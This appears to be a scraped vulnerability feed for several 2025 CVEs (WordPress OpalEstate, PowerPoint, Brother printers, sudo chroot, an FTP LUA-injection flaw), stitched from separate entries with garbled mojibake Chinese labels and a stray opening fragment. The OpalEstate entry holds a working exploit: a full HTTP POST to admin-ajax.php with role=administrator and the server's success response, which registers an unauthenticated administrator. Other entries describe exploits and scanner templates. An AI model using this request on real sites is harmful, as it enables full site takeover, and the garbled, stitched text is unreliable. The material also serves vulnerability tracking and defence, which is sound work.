Checking nsswitch.conf default values:

After calling chroot, sudo trys to parse the config values at nsswitch.conf to run the command, which leads it to try to open libnss_systemd.so.2.

entry.title: WordPress OpalEstate Plugin æœªæˆæƒæƒé™æå‡æ¼æ´
entry.content:
æ¼æ´ä¿¡æ¯

æ¼æ´åç§°ï¼š WordPress OpalEstate Plugin æœªæˆæƒæƒé™æå‡æ¼æ´

æ¼æ´ç¼–å·ï¼š

  • CVEï¼š CVE-2025-6934

æ¼æ´ç±»å‹ï¼š æƒé™æå‡

æ¼æ´ç­‰çº§ï¼š ä¸¥é‡

æ¼æ´æè¿°ï¼š WordPressçš„OpalEstateæ’ä»¶åœ¨å…¶AJAXæ³¨å†Œå¤„ç†ç¨‹åºä¸­å­˜åœ¨ä¸€ä¸ªä¸¥é‡æ¼æ´ï¼Œå…è®¸æœªç»è®¤è¯çš„ç”¨æˆ·æ³¨å†Œä¸ºç®¡ç†å‘˜ã€‚é—®é¢˜åœ¨äºopalestate_register_form AJAXæ“ä½œä¸­roleå‚æ•°çš„ä¸å®‰å…¨å¤„ç†ï¼Œè¯¥æ“ä½œé€šè¿‡admin-ajax.phpå…¬å¼€æš´éœ²ã€‚æ”»å‡»è€…åªéœ€æäº¤role=administratorå­—æ®µå³å¯æå‡æƒé™ï¼Œå¯¼è‡´ç½‘ç«™å®Œå…¨è¢«æ§åˆ¶ã€‚

äº§å“å‚å•†ï¼š WordPress

äº§å“åç§°ï¼š OpalEstate Plugin

æ¥æºï¼š https://github.com/MrjHaxcore/CVE-2025-6934

ç±»å‹ï¼š CVE-2025:github search

ä»“åº“æ–‡ä»¶

  • README.md

æ¥æºæ¦‚è¿°

ğŸš¨ WordPress OpalEstate Plugin - Unauthenticated Privilege Escalation Vulnerability

ğŸ” Description

The OpalEstate plugin for WordPress contains a critical vulnerability in its AJAX registration handler, allowing unauthenticated users to register as administrators.

The issue lies in the insecure handling of the role parameter in the opalestate_register_form AJAX action, which is exposed publicly via admin-ajax.php. An attacker with a valid nonce can escalate privileges by simply submitting the role=administrator field, resulting in full site compromise.

CVE ID: CVE-2025-6934
CVSS Score: 9.8 (Critical)
Published: June 30, 2025

ğŸ“‹ Vulnerable Endpoint/ POC

POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Length: 231
sec-ch-ua-platform: â€œWindowsâ€
Accept-Language: en-US,en;q=0.9
sec-ch-ua: â€œChromiumâ€;v=â€133â€, â€œNot(A:Brandâ€;v=â€99â€
sec-ch-ua-mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: application/json, text/javascript, /; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/wordpress/?page_id=16
Accept-Encoding: gzip, deflate, br
Cookie: wp-settings-time-1=1750938057; wp-settings-1=libraryContent%3Dbrowse; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; kawuda_cookie=1751024383267404614; PHPSESSID=rsbi6r8gs523c35v319f1jf4tt
Connection: keep-alive

username=mrjtest&email=mrjtest%40gmail.com&password=123&password1=123&role=administrator&confirmed_register=on&opalestate-register-nonce=db20fa048c&_wp_http_referer=%2Fwordpress%2F%3Fpage_id%3D16&ajax=1&action=opalestate_register_form

Response

HTTP/1.1 200 OK
Date: Wed, 02 Jul 2025 14:19:23 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
X-Powered-By: PHP/8.2.12
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
Pragma: no-cache
Content-Length: 53
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json; charset=UTF-8

{â€œstatusâ€:true,â€redirectâ€:â€/wordpress/?page_id=16â€}

Impact

Full WordPress site takeover
Unauthenticated admin account creation
Persistent backdoor access
Potential for privilege chaining and plugin/theme exploitation

ğŸ›¡ï¸ Mitigation
Remove or sanitize the role parameter from user-controlled input.
Force role assignment server-side (e.g., subscriber only).
Use wp_insert_user() or wp_create_user() with locked roles.
Validate user capabilities before processing sensitive actions.
Patch the plugin or disable AJAX registration if not essential.

BY MRJ HAXCORE

æ¼æ´æè¿°ï¼š è¯¥æ¼æ´æ˜¯Microsoft PowerPointä¸­çš„ä¸€ä¸ªUse-After-Free (UAF)æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¯±éª—ç”¨æˆ·æ‰“å¼€ç‰¹åˆ¶çš„PPTXæ–‡ä»¶æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚æ­¤PoCè„šæœ¬ç”Ÿæˆä¸€ä¸ªæ¶æ„çš„PPTXæ–‡ä»¶ï¼Œæ—¨åœ¨è§¦å‘UAFæ¼æ´ã€‚åœ¨æ˜“å—æ”»å‡»çš„PowerPointç‰ˆæœ¬ä¸­æ‰“å¼€ç”Ÿæˆçš„æ–‡ä»¶å¯èƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚

äº§å“å‚å•†ï¼š Microsoft

äº§å“åç§°ï¼š Microsoft PowerPoint

å½±å“ç‰ˆæœ¬ï¼š Microsoft PowerPoint 2019 and Office 365 versions prior to June 2025 Patch (KB5002689)

æ¥æºï¼š https://github.com/mbanyamer/mbanyamer-Microsoft-PowerPoint-Use-After-Free-Remote-Code-Execution-RCE

ç±»å‹ï¼š CVE-2025:github search

ä»“åº“æ–‡ä»¶

  • CVE2025-47175.py
  • LICENSE
  • README.md

æ¥æºæ¦‚è¿°

CVE-2025-47175 - Microsoft PowerPoint Use-After-Free (UAF) Remote Code Execution PoC

Overview

This repository contains a Proof of Concept (PoC) exploit for the CVE-2025-47175 vulnerability found in Microsoft PowerPoint.
The vulnerability is a Use-After-Free (UAF) bug that allows an attacker to execute arbitrary code by tricking a user into opening a specially crafted PPTX file.

Description

  • Vulnerability: Use-After-Free (UAF) in Microsoft PowerPoint
  • CVE ID: CVE-2025-47175
  • Affected Versions: Microsoft PowerPoint 2019 and Office 365 versions prior to June 2025 Patch (KB5002689)
  • Attack Vector: Local â€” requires victim to open a crafted PPTX file
  • Impact: Remote Code Execution (RCE)

This PoC script generates a malicious PPTX file designed to trigger the UAF vulnerability. Opening the generated file in a vulnerable PowerPoint version may lead to arbitrary code execution.

Usage

Options

OptionDescriptionDefault
-o, --outputOutput PPTX filenameexploit_cve_2025_47175.pptx
-i, --idShape ID (integer)1234
-n, --nameShape Name (string)MaliciousShape
-t, --textTrigger text inside the slideThis content triggers CVE-2025-47175 UAF vulnerability.

Example

Disclaimer

This PoC is for educational and research purposes only. Unauthorized use against systems without explicit permission is illegal. The author is not responsible for any misuse of this code.

Author

Mohammed Idrees Banyamer

  • Instagram: @banyamer_security
  • GitHub: https://github.com/mbanyamer

References

  • Microsoft Security Update Guide
  • Exploit-DB

entry.title: Brother Printers Authentication Bypass via Default Admin Password Vulnerability
entry.content:
æ¼æ´ä¿¡æ¯

æ¼æ´åç§°ï¼š Brother Printers Authentication Bypass via Default Admin Password Vulnerability

æ¼æ´ç¼–å·ï¼š

  • CVEï¼š CVE-2024-51978

æ¼æ´ç±»å‹ï¼š æƒé™ç»•è¿‡

æ¼æ´ç­‰çº§ï¼š ä¸¥é‡

æ¼æ´æè¿°ï¼š é€šè¿‡æ³„éœ²ç›®æ ‡è®¾å¤‡çš„åºåˆ—å·ï¼Œè¿œç¨‹æ”»å‡»è€…å¯ä»¥ç”Ÿæˆç›®æ ‡è®¾å¤‡çš„é»˜è®¤ç®¡ç†å‘˜å¯†ç ã€‚ç›®æ ‡è®¾å¤‡å¯èƒ½é€šè¿‡æœªç»èº«ä»½éªŒè¯çš„HTTPã€HTTPSã€IPPã€SNMPæˆ–PJLè¯·æ±‚æ³„éœ²å…¶åºåˆ—å·ã€‚

äº§å“å‚å•†ï¼š Brother

äº§å“åç§°ï¼š Brother Printers

æœç´¢è¯­æ³•ï¼š app=â€brother-Printerâ€

æ¥æºï¼š https://github.com/projectdiscovery/nuclei-templates/issues/12517

ç±»å‹ï¼š projectdiscovery/nuclei-templates:github issues

æ¥æºæ¦‚è¿°

Is there an existing template for this?

  • I have searched the existing templates.

Nuclei Template

Relevant dumped responses

Anything else?

The template fails quietly if target web site does not return a CSRF token in its response checked in this snippet:

extractors:  - type: regex    part: body    name: logbox    group: 1    regex:      - 'id="LogBox" name="(.*?)"'    internal: true  - type: regex    part: body    name: csrf    group: 1    regex:      - 'id="CSRFToken" name="CSRFToken" value="(.*?)"'    internal: true

Example output:
[WRN] [CVE-2024-51978] Could not make http request for https://xxx.xx.xx.xx: unresolved variables found: urlencode(csrf)

A website which does not return any token can still be vulnerable. As you can see in the first screenshot, it does not find the vulnerability

When i send CSRFToken value as empty, it does find it

The template should handle both situations. My suggestion is to send two seperate POST requests, one with csrf and one without it:

entry.title: Sudo æœ¬åœ°æƒé™æå‡æ¼æ´
entry.content:
æ¼æ´ä¿¡æ¯

æ¼æ´åç§°ï¼š Sudo æœ¬åœ°æƒé™æå‡æ¼æ´

æ¼æ´ç¼–å·ï¼š

  • CVEï¼š CVE-2025-32463

æ¼æ´ç±»å‹ï¼š æƒé™æå‡

æ¼æ´ç­‰çº§ï¼š é«˜å±

æ¼æ´æè¿°ï¼š Sudoæ˜¯ä¸€ä¸ªåœ¨Unix-likeç³»ç»Ÿä¸Šå¹¿æ³›ä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå…è®¸æˆæƒç”¨æˆ·ä»¥æå‡çš„æƒé™æ‰§è¡Œå‘½ä»¤ã€‚Stratascale Cyber Research Unit (CRU)å‘ç°äº†Sudoä¸­çš„ä¸¤ä¸ªæœ¬åœ°æƒé™æå‡æ¼æ´ä¹‹ä¸€ï¼Œå³CVE-2025-32463ã€‚è¯¥æ¼æ´å½±å“Sudoç‰ˆæœ¬1.9.14è‡³1.9.17ï¼Œå…è®¸æœªæˆæƒçš„æœ¬åœ°ç”¨æˆ·é€šè¿‡æ»¥ç”¨â€“chroot (-R)é€‰é¡¹è·å¾—rootè®¿é—®æƒé™ï¼Œå³ä½¿ç”¨æˆ·æ²¡æœ‰å®šä¹‰sudoè§„åˆ™ã€‚æ­¤å­˜å‚¨åº“æä¾›äº†ä¸€ä¸ªPythonæ¦‚å¿µéªŒè¯(PoC)é‡æ–°å®ç°äº†CRUå›¢é˜Ÿå¼€å‘çš„åŸå§‹Bashåˆ©ç”¨ç¨‹åºï¼Œå±•ç¤ºäº†å¦‚ä½•é€šè¿‡ç”¨æˆ·æ§åˆ¶çš„chrootç¯å¢ƒä¸­çš„ç²¾å¿ƒåˆ¶ä½œçš„nsswitch.confæ–‡ä»¶å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚

äº§å“åç§°ï¼š Sudo

å½±å“ç‰ˆæœ¬ï¼š 1.9.14 <= version <= 1.9.17

æ¥æºï¼š https://github.com/pevinkumar10/CVE-2025-32463

ç±»å‹ï¼š CVE-2025:github search

ä»“åº“æ–‡ä»¶

  • README.md
  • exploit.py

æ¥æºæ¦‚è¿°

ğŸ“˜ Introduction

Sudo is a widely used command-line utility on Unix-like systems that allows permitted users to execute commands with elevated privileges. It plays a critical role in enforcing the principle of least privilege and maintaining a secure audit trail of administrative activities.
The Stratascale Cyber Research Unit (CRU) discovered two local privilege escalation vulnerabilities in Sudo, one of which is CVE-2025-32463. This vulnerability affects Sudo versions 1.9.14 through 1.9.17, and allows unprivileged local users to gain root access by abusing the â€“chroot (-R) option, even if no sudo rules are defined for the user.
This repository provides a Python proof-of-concept (PoC) reimplementation of the original Bash exploit developed by the CRU team. It demonstrates how to achieve arbitrary code execution as root via a crafted nsswitch.conf file inside a user-controlled chroot environment.

entry.title: CVE-2025-47812
entry.content:
æè¿°ï¼š ** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.

On June 30, 2025 a detailed technical analysis of CVE-2025-47812 was published by the original finders, RCE Security. This analysis shows how an anonymous user (with no password), can leverage a NULL byte injection issue, allowing for arbitrary attacker-controlled LUA code to be placed in a session file. An attacker can then execute this arbitrary LUA code to achieve RCE. The technical analysis shows this occurring with root privileges by default on a Linux based system, and notes that on Windows, code execution will be as NT AUTHORITY\SYSTEM.

On July 1, 2025, a Metasploit exploit module for CVE-2025-47812 was added the Metasploit pull queue.

Given this is a file transfer server, is vulnerable to unauthenticated RCE, and public exploit code is available, I have rated this as Extremely High attacker Value, and Extremely High exploitability.
